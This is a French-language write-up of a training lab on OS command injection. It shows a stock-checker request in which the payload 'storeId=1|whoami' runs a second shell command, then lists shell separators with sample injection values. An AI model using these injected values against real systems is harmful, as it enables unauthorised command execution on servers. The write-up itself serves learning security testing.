## 🎯 Objectif

Exécuter la commande :

whoami

afin d’obtenir l’utilisateur système exécutant la commande backend.

---

# 🔍 Surface d’attaque

Fonctionnalité : **Stock checker**

Requête interceptée dans Burp :

POST /product/stock HTTP/2  
Content-Type: application/x-www-form-urlencoded

Body :

productId=1&storeId=1

---

# 💡 Hypothèse

Le serveur semble appeler une **commande système** pour récupérer le stock.

Probablement quelque chose comme :

stockreport.pl productId storeId

Si l’entrée utilisateur est injectée directement dans la commande shell :

stockreport.pl 1 1

alors il est possible d’injecter une commande.

---

# 🛠 Exploitation

Modification du paramètre :

storeId=1|whoami

La commande exécutée devient :

stockreport.pl 1 | whoami

Le shell exécute donc :

whoami

---

# ⚡ Résultat

Réponse serveur :

peter-79jpp8

Cela correspond à **l’utilisateur système du serveur**.

Lab résolu.

---

# 🐞 Vulnérabilité

Nom :

OS Command Injection

Cause :

Les paramètres utilisateur sont insérés directement dans une commande shell sans validation.

---

# 🧠 Pattern à retenir

Quand tu vois une fonctionnalité comme :

- check stock
    
- ping
    
- traceroute
    
- image convert
    
- PDF generation
    
- git
    
- system tools
    

pense immédiatement :

OS Command Injection

---

# 🔧 Caractères d’injection classiques

Les séparateurs shell :

|  
&  
;  
&&  
||  
``  
$()

Exemples :

1|whoami  
1;whoami  
1&&whoami

---

# 📌 Ce que tu as bien fait

Tu as immédiatement compris :

- qu’il fallait **modifier un paramètre**
    
- que la fonctionnalité appelait probablement **une commande système**
    
- que l’on pouvait **injecter une commande**
    

C’est exactement **le bon réflexe**.

---

# ⭐ Ce qui est très intéressant

Tu viens de passer d’un lab qui t’a pris **beaucoup de temps** à un lab résolu **très vite**.

C’est le signe que ton cerveau commence déjà à reconnaître **les patterns de vulnérabilités**.

C’est exactement comme ça que progresse un hunter.

---

